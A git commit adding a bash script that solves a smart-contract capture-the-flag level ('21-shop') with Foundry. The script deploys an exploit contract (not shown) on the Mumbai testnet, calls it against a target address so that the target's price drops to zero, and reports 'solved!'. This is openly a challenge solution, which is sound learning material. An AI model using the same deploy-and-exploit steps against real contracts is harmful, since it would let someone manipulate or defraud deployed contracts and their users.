af8e4346c853030d7346a696574dc77346729191
elaleman <elalemanx@example.com>
2023-05-29 23:47:01 -0300

    add solution to challenge 21 with foundry

---
+++ 21-shop/solution-foundry/solution.sh
@@ -0,0 +1,51 @@
+#!/bin/bash
+
+PRIVATE_KEY="$1"
+if [ -z "$PRIVATE_KEY" ]
+then
+    echo "PRIVATE_KEY must be passed as the first argument" >&2
+    exit 1
+fi
+
+CONTRACT_ADDRESS="$2"
+if [ -z "$CONTRACT_ADDRESS" ]
+then
+    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
+    exit 1
+fi
+
+echo "[INFO] Deploying exploit contract..." >&2
+EXPLOIT_ADDRESS=$(forge create \
+    --rpc-url https://matic-mumbai.chainstacklabs.com \
+    --private-key $PRIVATE_KEY \
+    src/Exploit.sol:Exploit\
+    | grep "Deployed to:" \
+    | awk '{print $3}')
+
+if [ $? -ne 0 ] || [ -z "$EXPLOIT_ADDRESS" ]
+then
+    echo "[ERROR] Exploit contract deployment failed" >&2
+    exit 1
+fi
+echo "[INFO] Contract deployed to $EXPLOIT_ADDRESS" >&2
+
+echo "[INFO] Executing exploit function..." >&2
+cast send "$EXPLOIT_ADDRESS" \
+    --rpc-url https://matic-mumbai.chainstacklabs.com \
+    --private-key $PRIVATE_KEY \
+    --gas-limit 100000 \
+    "exploit(address)" \
+    "$CONTRACT_ADDRESS" >/dev/null
+
+echo "[INFO] Checking if exploit succeeded..." >&2
+PRICE=$(cast call "$CONTRACT_ADDRESS" \
+    --rpc-url https://matic-mumbai.chainstacklabs.com \
+    "price()(uint256)" \
+    "$CONTRACT_ADDRESS")
+
+if [ $PRICE -eq 0 ]
+then
+    echo "solved!"
+else
+    echo "[ERROR] exploit failed" >&2
+fi
